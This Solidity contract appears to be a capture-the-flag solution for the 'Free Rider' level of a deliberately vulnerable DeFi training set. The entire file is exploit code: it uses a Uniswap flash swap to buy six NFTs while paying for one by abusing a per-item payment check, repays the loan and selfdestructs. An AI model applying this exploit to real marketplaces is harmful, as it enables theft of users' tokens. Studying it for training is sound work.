// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

contract EvilFreeRider is IUniswapV2Callee, ERC721Holder {
    address payable owner;
    FreeRiderNFTMarketplace public marketplace;
    FreeRiderBuyer public buyer;
    IUniswapV2Pair pair;
    uint256 constant nftPrice = 15 ether;
    uint8 constant numberOfNFT = 6;

    constructor(
        FreeRiderNFTMarketplace _market,
        IUniswapV2Pair _pair,
        FreeRiderBuyer _buyer
    ) {
        owner = payable(msg.sender);
        marketplace = _market;
        pair = _pair;
        buyer = _buyer;
    }

    function attack() public {
        require(msg.sender == owner, "Only owner can call this function");
        bytes memory data = abi.encode(pair.token0(), nftPrice);

        pair.swap(nftPrice, 0, address(this), data);
    }

    function uniswapV2Call(
        address _sender,
        uint256,
        uint256,
        bytes calldata _data
    ) external override {
        require(msg.sender == address(pair), "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        IWETH weth = IWETH(tokenBorrow);
        weth.withdraw(amount);

        uint256[] memory tokenIds = new uint256[](numberOfNFT);
        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());

        for (uint256 i = 0; i < numberOfNFT; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }

        weth.deposit{value: amountToRepay}();

        IERC20(tokenBorrow).transfer(address(pair), amountToRepay);

        selfdestruct(owner);
    }

    receive() external payable {}
}
